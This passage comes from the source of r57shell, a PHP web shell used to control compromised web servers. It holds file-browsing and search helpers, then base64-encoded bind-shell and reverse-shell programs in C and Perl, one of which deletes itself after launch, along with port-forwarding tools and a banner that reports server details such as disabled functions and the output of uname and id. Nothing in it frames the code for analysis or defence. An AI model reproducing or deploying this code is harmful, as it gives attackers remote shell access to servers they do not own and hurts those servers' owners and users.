          {
            if($types)
            {
              $pos = @strrpos($file,".");
              $ext = @substr($file,$pos,@strlen($file)-$pos);
              if(@in_array($ext,@explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }

  function DirFilesWide($dir)
  {
    $files = Array();
    $dirs = Array();
    if($handle = @opendir($dir))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
          {
            $file = @strtoupper($file);
            $dirs[$file] = '&lt;DIR&gt;';
          }
          else
            $files[$file] = @filesize($dir."/".$file);
        }
      }
      @closedir($handle);
      @ksort($dirs);
      @ksort($files);
      $files = @array_merge($dirs,$files);
    }
    return $files;
  }

  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if($handle = @opendir($dir))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }

  function DirPrintHTMLHeaders($dir)
  {
    $handle = @opendir($dir) or die("Can't open directory $dir");
    echo "    <ul style='margin-left: 0px; padding-left: 20px;'>\n";
    while (false !== ($file = @readdir($handle)))
    {
      if ($file != "." && $file != "..")
      {
        if(@is_dir($dir."/".$file))
        {
          echo "      <li><b>[ $file ]</b></li>\n";
          DirPrintHTMLHeaders($dir."/".$file);
        }
        else
        {
          $pos = @strrpos($file,".");
          $ext = @substr($file,$pos,@strlen($file)-$pos);
          if(@in_array($ext,array('.htm','.html')))
          {
            $header = '-=None=-';
            $strings = @file($dir."/".$file) or die("Can't open file ".$dir."/".$file);
            for($a=0;$a<count($strings);$a++)
            {
              $pattern = '(<title>(.+)</title>)';
              if(@eregi($pattern,$strings[$a],$pockets))
              {
                $header = "&laquo;".$pockets[2]."&raquo;";
                break;
              }
            }
            echo "      <li>".$header."</li>\n";
          }
        }
      }
    }
    echo "    </ul>\n";
    @closedir($handle);
  }

  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;

    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }

    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          if($count = @preg_match_all($pattern,$CurString,$aa))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }

  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }

/*** base64 ---------------------------------------------------------------------------------------------------- */
/* --- Port bind source C -------------------------------------------------------------------------------------- */
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
/* --- END Port bind source C ---------------------------------------------------------------------------------- */
/* --- Port bind source PERL ----------------------------------------------------------------------------------- */
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
/* --- END Port bind source PERL ------------------------------------------------------------------------------- */
/* --- Back connect source PERL -------------------------------------------------------------------------------- */
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
/* --- END Back connect source PERL ---------------------------------------------------------------------------- */
/* --- Back connect source C ----------------------------------------------------------------------------------- */
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
/* --- END Back connect source C ------------------------------------------------------------------------------- */
/* --- datapipe.c ---------------------------------------------------------------------------------------------- */
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
/* --- END datapipe.c ------------------------------------------------------------------------------------------ */
/* --- datapipe.pl --------------------------------------------------------------------------------------------- */
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
/* --- END datapipe.pl ----------------------------------------------------------------------------------------- */

/*** END base64 ------------------------------------------------------------------------------------------------ */

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* LOGO + info */
echo $head;
echo '</head>
<body bgcolor="#e4e0d8">
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc width=160>
<!-- logo -->
<font face=Verdana size=2>'.ws(1).'&nbsp;
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>
</font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
$si = 3;
echo ws(2);
echo "<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
echo ws(2);
echo (($safe_mode)?("safe_mode: <b>ON</b>"):("safe_mode: <b>OFF</b>"));
echo ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("<b>ON (".@curl_version().")</b>"):("<b>OFF</b>"));
echo ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on)
 {
 $client_api = @function_exists('mysql_get_client_info') ? @mysql_get_client_info() : "";
 echo "ON ($client_api)</b>";
 }
else
 {
 echo "OFF</b>";
 }
echo "<br>".ws(2);
echo "Disable functions : <b>";
$df = @ini_get('disable_functions');
if(empty($df)) echo "NONE</b>"; else echo "$df</b>";
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* display information */
echo $font;
if(!$windows){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
$uname = ex('uname -a');
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
if(!$safe_mode){
$bsd1 = ex('/sbin/sysctl -n kern.ostype');
$bsd2 = ex('/sbin/sysctl -n kern.osrelease');
$lin1 = ex('/sbin/sysctl -n kernel.ostype');
$lin2 = ex('/sbin/sysctl -n kernel.osrelease');
}
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
